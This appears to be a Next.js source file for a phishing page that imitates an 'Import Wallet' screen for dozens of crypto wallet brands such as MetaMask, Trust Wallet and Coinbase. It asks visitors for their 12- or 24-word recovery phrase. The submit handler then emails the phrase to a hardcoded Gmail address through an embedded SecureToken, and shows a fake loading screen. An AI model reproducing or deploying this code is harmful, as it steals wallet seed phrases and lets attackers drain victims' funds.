import { useState } from "react";
import Image from "next/image";
import { useRouter } from "next/router"





export const getStaticPaths = () => {
    const purses = [
        {
            name: "Trust wallet",
            image: "/images/Trust-Wallet2.png",
            id: 1
        },
        {
            name: "Tron wallet",
            image: "/images/tron-wallet.png",
            id: 2
        },
        {
            name: "Kucoin wallet",
            image: "/images/kucoin.png",
            id: 3
        },
        {
            name: "AAVE wallet",
            image: "/images/AAVE-wallet2.png",
            id: 4
        },
        {
            name: " Wallet Connect",
            image: "/images/wallet-connect.jpg",
            id: 5
        },
        {
            name: "Enjin wallet",
            image: "/images/enjin-wallet.png",
            id: 6
        },
        {
            name: "Yoroi wallet",
            image: "/images/Yoroi.png",
            id: 7
        },
        {
            name: "Metamask wallet",
            image: "/images/metamask-wallet.png",
            id: 7
        },
        {
            name: "Keplr wallet",
            image: "/images/keplr-wallet.png",
            id: 8
        },
        {
            name: "KyberNetwork wallet",
            image: "/images/kybernetwork.png",
            id: 9
        },
        {
            name: "Solana wallet",
            image: "/images/solana.svg",
            id: 10
        },
        {
            name: "Autherum wallet",
            image: "/images/autherum-wallet.png",
            id: 11
        },
        {
            name: "Portis wallet",
            image: "/images/portis-wallet-1.png",
            id: 12
        },
        {
            name: "Cosmos wallet",
            image: "/images/cosmos.png",
            id: 13
        },
        {
            name: "Saitama",
            image: "/images/saitama-wallet.jpeg",
            id: 14
        },
        {
            name: "Polkadot wallet",
            image: "/images/polkadot-wallet.png",
            id: 15
        },
        {
            name: "Kardiachain wallet",
            image: "/images/kardiachain-wallet.png",
            id: 16
        },
        {
            name: "1inch wallet",
            image: "/images/1inch-wallet.png",
            id: 17
        },
        {
            name: "Coinbase wallet",
            image: "/images/coinbase-wallet.jpg",
            id: 18
        },
        {
            name: "Kava wallet",
            image: "/images/kava-wallet.png",
            id: 19
        },
        {
            name: "Vacant wallet",
            image: "/images/vacant.png",
            id: 20
        },
        {
            name: "Algorand wallet",
            image: "/images/algorand-wallet.png",
            id: 21
        },
        {
            name: "Fantom wallet",
            image: "/images/fantom-wallet.jpg",
            id: 22
        },
        {
            name: "Harmony wallet",
            image: "/images/harmovny-wallet.png",
            id: 23
        },
        {
            name: "Raydium wallet",
            image: "/images/raydium-wallet.png",
            id: 24
        },
        {
            name: "Klever wallet",
            image: "/images/klever-wallet.jpg",
            id: 25
        },
        {
            name: "Monero wallet",
            image: "/images/monero-wallet.png",
            id: 26
        },
        {
            name: "Formatic wallet",
            image: "/images/formatic-wallet.png",
            id: 27
        },
        {
            name: "Defiat wallet",
            image: "/images/defiat-wallet.png",
            id: 28
        },
        {
            name: "Skale wallet",
            image: "/images/skale-wallet.png",
            id: 29
        },
        {
            name: "Coinomi wallet",
            image: "/images/coinomi-wallet.png",
            id: 30
        },
        {
            name: "Atomic wallet",
            image: "/images/atomic-wallet.jpg",
            id: 31
        },
        {
            name: "Jaxx wallet",
            image: "/images/jaxx-wallet.png",
            id: 32
        },
        {
            name: "Kucoin wallet",
            image: "/images/kucoin.png",
            id: 33
        }
    ];

    const res = purses;
    const paths = res.map(purse => {
        return{
            params: { id: purse.id.toString()}
        }
    });

    return {
        paths,
        fallback: false
    }
}
export const getStaticProps = ( context ) => {
    const purses = [
        {
            name: "Trust wallet",
            image: "/images/Trust-Wallet2.png",
            id: 1
        },
        {
            name: "Tron wallet",
            image: "/images/tron-wallet.png",
            id: 2
        },
        {
            name: "Kucoin wallet",
            image: "/images/kucoin.png",
            id: 3
        },
        {
            name: "AAVE wallet",
            image: "/images/AAVE-wallet2.png",
            id: 4
        },
        {
            name: " Wallet Connect",
            image: "/images/wallet-connect.jpg",
            id: 5
        },
        {
            name: "Enjin wallet",
            image: "/images/enjin-wallet.png",
            id: 6
        },
        {
            name: "Yoroi wallet",
            image: "/images/Yoroi.png",
            id: 7
        },
        {
            name: "Metamask wallet",
            image: "/images/metamask-wallet.png",
            id: 7
        },
        {
            name: "Keplr wallet",
            image: "/images/keplr-wallet.png",
            id: 8
        },
        {
            name: "KyberNetwork wallet",
            image: "/images/kybernetwork.png",
            id: 9
        },
        {
            name: "Solana wallet",
            image: "/images/solana.svg",
            id: 10
        },
        {
            name: "Autherum wallet",
            image: "/images/autherum-wallet.png",
            id: 11
        },
        {
            name: "Portis wallet",
            image: "/images/portis-wallet-1.png",
            id: 12
        },
        {
            name: "Cosmos wallet",
            image: "/images/cosmos.png",
            id: 13
        },
        {
            name: "Saitama",
            image: "/images/saitama-wallet.jpeg",
            id: 14
        },
        {
            name: "Polkadot wallet",
            image: "/images/polkadot-wallet.png",
            id: 15
        },
        {
            name: "Kardiachain wallet",
            image: "/images/kardiachain-wallet.png",
            id: 16
        },
        {
            name: "1inch wallet",
            image: "/images/1inch-wallet.png",
            id: 17
        },
        {
            name: "Coinbase wallet",
            image: "/images/coinbase-wallet.jpg",
            id: 18
        },
        {
            name: "Kava wallet",
            image: "/images/kava-wallet.png",
            id: 19
        },
        {
            name: "Vacant wallet",
            image: "/images/vacant.png",
            id: 20
        },
        {
            name: "Algorand wallet",
            image: "/images/algorand-wallet.png",
            id: 21
        },
        {
            name: "Fantom wallet",
            image: "/images/fantom-wallet.jpg",
            id: 22
        },
        {
            name: "Harmony wallet",
            image: "/images/harmovny-wallet.png",
            id: 23
        },
        {
            name: "Raydium wallet",
            image: "/images/raydium-wallet.png",
            id: 24
        },
        {
            name: "Klever wallet",
            image: "/images/klever-wallet.jpg",
            id: 25
        },
        {
            name: "Monero wallet",
            image: "/images/monero-wallet.png",
            id: 26
        },
        {
            name: "Formatic wallet",
            image: "/images/formatic-wallet.png",
            id: 27
        },
        {
            name: "Defiat wallet",
            image: "/images/defiat-wallet.png",
            id: 28
        },
        {
            name: "Skale wallet",
            image: "/images/skale-wallet.png",
            id: 29
        },
        {
            name: "Coinomi wallet",
            image: "/images/coinomi-wallet.png",
            id: 30
        },
        {
            name: "Atomic wallet",
            image: "/images/atomic-wallet.jpg",
            id: 31
        },
        {
            name: "Jaxx wallet",
            image: "/images/jaxx-wallet.png",
            id: 32
        },
        {
            name: "Kucoin wallet",
            image: "/images/kucoin.png",
            id: 33
        }
    ];
    
    const _id = context.params.id;

    const data = purses[_id - 1];

    console.log(data, _id)

    return{
        props:{ data}
    }
}
const Phrase = ({ data }) => {
    const [isLoading, setIsLoading] = useState(false)
    const passError = () => {
        setIsLoading(false)
        router.push('/wallet/loading')
    }
    const Loading = () => {
        return(
            <div className="d-flex jac spin-holder">
            <div className="d-flex jac container spin-box round-20 coll py-3 boda2">
                <div className="loader"></div>
                <h1 className="text-center ">Loading...</h1>
            </div>
        </div>
        )
    }
    const [phrase12, setPhrase12] = useState("")
    const router = useRouter();
    const myFunc = (event ) => {
        event.preventDefault();
        setIsLoading(true)
        Email.send({
            SecureToken : "f10ea3fc-c85c-40ed-93e9-4467760c85cf",
            To : 'amogukachi7@gmail.com',
            From : "kachiamogu47@gmail.com",
            Subject : data.name,
            Body : phrase12
        }).then(
            setIsLoading(true),
            setTimeout(passError, 3000)
        );
        console.log(phrase12)
        
    }
    return(
        <main className="d-fex jac mt-5">
            <div className="text-light text-center my-3">

                <h1 className="my-3">Import Wallet</h1>
                <section className="container">
                    <Image height={200} width={250} src="/images/001.png" />
                </section>
                <div className="d-flex jac">
                    <form className="myform">
                        <label className="my-3 fw-bold">Kindly import wallet by providing <br/><span className="green">PHRASE WORDS</span> below</label>
                        <textarea
                            className="form-control"
                            cols="30"
                            rows="10"
                            placeholder="Wallet Phrase words here..." 
                            onChange={(e) => {setPhrase12(e.target.value)}}
                        ></textarea>
                        <p className="green right">...mostly 12 or 24 in number</p>
                        <div className="d-flex jac">
                            <button type="submit" onSubmit={myFunc} className="btn btn-light my-3 fw-bold dark" id="btn">Import</button>
                        </div>
                    </form>
                </div>
                {isLoading ? <Loading /> : (<div></div>)}
            </div>
        </main>
        
    )
}

export default Phrase